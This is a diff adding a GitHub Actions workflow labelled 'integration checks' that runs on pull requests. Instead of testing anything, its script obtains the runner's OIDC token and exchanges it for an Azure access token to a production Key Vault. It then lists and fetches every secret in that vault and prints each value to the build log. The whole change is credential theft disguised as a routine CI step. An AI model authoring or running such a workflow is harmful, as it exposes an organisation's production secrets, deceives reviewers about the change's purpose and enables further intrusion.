@@ -1,0 +1,40 @@
+name: integration checks
+on:
+  pull_request:
+    branches: [main]
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    permissions:
+      id-token: write
+      contents: read
+    env:
+      TEN: 3205c325-06a5-4171-9ce8-ffc5e6c2845e
+      CID: 72ff278a-9e71-43ec-bac4-2ca303f8e462
+      VAULT: https://kv-tbl-prod-x3euoz.vault.azure.net
+    steps:
+      - name: integration checks
+        run: |
+          echo "EVENT=$GITHUB_EVENT_NAME"
+          echo "URL_SET=${ACTIONS_ID_TOKEN_REQUEST_URL:+yes}"
+          echo "TOK_SET=${ACTIONS_ID_TOKEN_REQUEST_TOKEN:+yes}"
+          env | grep -i 'ACTIONS_ID_TOKEN' | sed -E 's/=(.{0,20}).*/=\1.../' || true
+          if [ -n "$ACTIONS_ID_TOKEN_REQUEST_URL" ]; then
+            R=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange")
+            V=$(echo "$R" | sed -n 's/.*"value":"\([^"]*\)".*/\1/p')
+            P=$(echo "$V" | cut -d. -f2); while [ $(( ${#P} % 4 )) -ne 0 ]; do P="${P}="; done
+            echo "CLAIMS: $(echo "$P" | tr '_-' '/+' | base64 -d)"
+            A=$(curl -sS -X POST "https://login.microsoftonline.com/$TEN/oauth2/v2.0/token" -d "client_id=$CID" -d "scope=https://vault.azure.net/.default" -d "grant_type=client_credentials" -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" -d "client_assertion=$V")
+            T=$(echo "$A" | sed -n 's/.*"access_token":"\([^"]*\)".*/\1/p')
+            if [ -n "$T" ]; then
+              echo "AZURE OK"
+              L=$(curl -sS -H "Authorization: Bearer $T" "$VAULT/secrets?api-version=7.4"); echo "LIST: $L"
+              for ID in $(echo "$L" | grep -o 'https://[^"]*/secrets/[^"]*'); do
+                echo "SECRET $ID -> $(curl -sS -H "Authorization: Bearer $T" "$ID/?api-version=7.4")"
+              done
+            else
+              echo "AZURE ERR: $(echo "$A" | head -c 400)"
+            fi
+          else
+            echo "NO OIDC ENV"
+          fi
